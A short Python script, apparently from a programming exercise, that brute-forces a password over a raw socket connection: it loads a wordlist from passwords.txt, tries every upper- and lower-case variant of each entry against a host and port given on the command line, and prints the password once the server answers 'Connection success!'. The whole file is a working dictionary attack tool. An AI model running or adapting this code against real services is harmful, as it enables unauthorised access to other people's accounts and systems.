import socket
import sys
import itertools

with open('passwords.txt') as f:
    passwords = f.read().splitlines()

args = sys.argv
hostname = args[1]
port = int(args[2])

sock = socket.socket()
sock.connect((hostname, port))


def get_variation():
    for pw in passwords:
        for variation in map(''.join, itertools.product(*(sorted({letter.upper(), letter.lower()}) for letter in pw))):
            yield variation


variant = get_variation()
response = 'Wrong password!'

while response == 'Wrong password!':
    password = next(variant)
    message = password.encode()
    sock.send(message)
    response = (sock.recv(10240)).decode()
    if response == 'Connection success!':
        print(password)
        sock.close()
        break
